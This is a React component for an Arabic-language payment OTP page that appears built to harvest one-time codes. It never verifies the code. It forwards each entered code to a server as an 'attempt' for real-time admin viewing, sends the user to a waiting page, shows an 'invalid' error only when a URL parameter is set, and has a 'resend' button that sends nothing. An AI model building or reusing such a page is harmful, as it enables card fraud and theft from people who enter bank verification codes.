import { useState, useRef, useEffect } from 'react';
import { useLocation } from 'wouter';
import { X } from 'lucide-react';
import { Shell } from '../shared';
import { createOtpAttempt } from '@workspace/api-client-react';

export function PaymentVerificationPage() {
  const [, setLocation] = useLocation();
  const [code, setCode] = useState(''); // حقل واحد بدلاً من مصفوفة حقول
  const [error, setError] = useState('');
  const [showInvalidError, setShowInvalidError] = useState(false);
  const [isFocused, setIsFocused] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  const fullCode = code;

  // Get order ID from localStorage
  const orderData = localStorage.getItem('dheebti-last-order');
  const orderId = orderData ? JSON.parse(orderData).id : null;

  // Check URL params on mount
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('error') === 'invalid') {
      setShowInvalidError(true);
      // Clear URL params after reading
      window.history.replaceState({}, '', window.location.pathname);
    }
  }, []);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, ''); // أرقام فقط
    if (value.length <= 6) {
      setCode(value);
      setError('');
      setShowInvalidError(false);
    }
  };

  const handleResend = () => {
    setCode('');
    setError('');
    setShowInvalidError(false);
    // Focus input after slight delay
    setTimeout(() => {
      inputRef.current?.focus();
    }, 100);
  };

  const handleVerify = async () => {
    // التحقق من أن الرمز إما 4 أو 6 أرقام
    if (fullCode.length !== 4 && fullCode.length !== 6) {
      setError('يرجى إدخال رمز التحقق كاملاً (4 أو 6 أرقام)');
      return;
    }
    
    // Send OTP to server as a new attempt
    if (orderId) {
      try {
        await createOtpAttempt(orderId, {
          otpCode: fullCode,
          success: false, // Default to false, will be updated if verified
        });
        // Dispatch event for admin real-time updates
        window.dispatchEvent(new CustomEvent('dheebti-otp-attempt', { 
          detail: { 
            orderId,
            customerName: ''
          } 
        }));
      } catch (error) {
        console.error('Failed to save OTP attempt:', error);
      }
    }
    
    // Navigate to waiting page
    setLocation('/payment-waiting');
  };

  // تحديد عدد المربعات المعروضة: إذا تجاوز 4 أرقام يظهر 6 مربعات، وإلا يظهر 6 افتراضياً ليتسع لـ 4 أو 6 أرقام
  const totalBoxes = code.length > 4 ? 6 : (code.length === 4 ? 4 : 6);

  return (
    <Shell>
      <div className="page-enter mx-auto flex min-h-[calc(100vh-104px)] items-center justify-center px-5 py-10 lg:py-16">
        {/* OTP Form Card */}
        <div className="relative flex w-[340px] flex-col items-center justify-center gap-6 rounded-[22px] border-[5px] border-white bg-white p-6 shadow-[0px_0px_20px_rgba(0,0,0,0.082)] sm:w-[360px]">
          {/* Exit Button */}
          <button
            onClick={() => setLocation('/payment')}
            className="absolute right-4 top-4 grid size-9 place-items-center rounded-full bg-white text-2xl text-black shadow-[0px_0px_20px_rgba(0,0,0,0.171)]"
          >
            <X size={22} />
          </button>

          {/* Main Heading */}
          <span className="pt-4 text-2xl font-bold text-[rgb(15,15,15)]">أدخل رمز التحقق</span>

          {/* Subheading */}
          <p className="text-center text-base leading-6 text-black">
            تم إرسال رمز التحقق إلى رقم هاتفك
          </p>

          {/* Single OTP Input + Visual Boxes */}
          <div className="relative flex w-full justify-center">
            {/* الحقل الوحيد المخفي شفافاً للتركيز والكتابة */}
            <input
              ref={inputRef}
              type="tel"
              inputMode="numeric"
              maxLength={6}
              value={code}
              onChange={handleChange}
              onFocus={() => setIsFocused(true)}
              onBlur={() => setIsFocused(false)}
              autoFocus
              className="absolute inset-0 z-10 size-full opacity-0 cursor-pointer"
            />

            {/* الشكل البصري للمربعات */}
            <div className="flex flex-row items-center justify-center gap-2" dir="ltr">
              {Array.from({ length: totalBoxes }).map((_, index) => {
                const digit = code[index] || '';
                const isCurrentFocused = isFocused && (code.length === index || (code.length === totalBoxes && index === totalBoxes - 1));

                return (
                  <div
                    key={index}
                    className={`flex h-[48px] w-[38px] items-center justify-center rounded-[10px] bg-[rgb(228,228,228)] text-center text-lg font-semibold text-[rgb(44,44,44)] transition-all duration-300 ${
                      isCurrentFocused
                        ? 'bg-[rgba(127,129,255,0.199)] shadow-[0_0_0_2px_rgb(127,129,255)]'
                        : ''
                    }`}
                    style={{ direction: 'ltr', textAlign: 'center' }}
                  >
                    {digit}
                  </div>
                );
              })}
            </div>
          </div>

          {/* Error Message */}
          {(error || showInvalidError) && (
            <p className="text-center text-base text-red-500">
              {error || 'رمز التحقق غير صحيح أو منتهي، يرجى التحقق مرة أخرى أو انتظار رمز جديد'}
            </p>
          )}

          {/* Verify Button */}
          <button
            onClick={handleVerify}
            className="h-[52px] w-full cursor-pointer rounded-[14px] border-none bg-[rgb(127,129,255)] text-lg font-semibold text-white transition-all duration-200 hover:bg-[rgb(144,145,255)]"
          >
            تحقق
          </button>

          {/* Resend Note */}
          <p className="flex flex-col items-center justify-center gap-1.5 text-base text-black">
            <span>لم تستلم الرمز؟</span>
            <button
              onClick={handleResend}
              className="cursor-pointer border-none bg-transparent text-lg font-bold text-[rgb(127,129,255)]"
            >
              إعادة إرسال
            </button>
          </p>
        </div>
      </div>
    </Shell>
  );
}
